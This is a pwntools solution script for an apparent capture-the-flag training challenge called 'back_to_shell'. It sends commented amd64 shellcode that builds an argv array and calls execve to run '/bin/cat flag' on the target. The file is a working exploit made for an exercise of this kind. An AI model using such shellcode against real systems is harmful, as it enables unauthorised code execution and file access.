# /bin/cat approach

from pwn import *

COMMANDS = """
b *0x000000000040116e
c
"""
context.arch = "amd64"

# python3 b.py DEBUG

if args.REMOTE:
    c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./back_to_shell", gdbscript=COMMANDS)
    else:
        c = process("./back_to_shell")

c.recvuntil(b"Shellcode: ")

shellcode = """
// we need a line terminator because /bin/cat + line term is 9 byte long
// so we push first on the stack a zero
xor rdi, rdi
push rdi
mov rdi, 0x7461632f6e69622f
push rdi
mov rdi, rsp
// now we push "flag" for cat argument
mov rsi, 0x0067616c66
push rsi
mov rsi, rsp
// rdx must be zero
xor rdx, rdx
// now we need to push in reverse order our register and make rsi poin to
// the top of the stack, in this way we have created a list of pointers
push rdx
push rsi
push rdi
mov rsi, rsp
// lastly setup execve syscall
mov rax, 0x3b
syscall
"""
shellcode_c = asm(shellcode)

c.send(shellcode_c)
c.interactive()
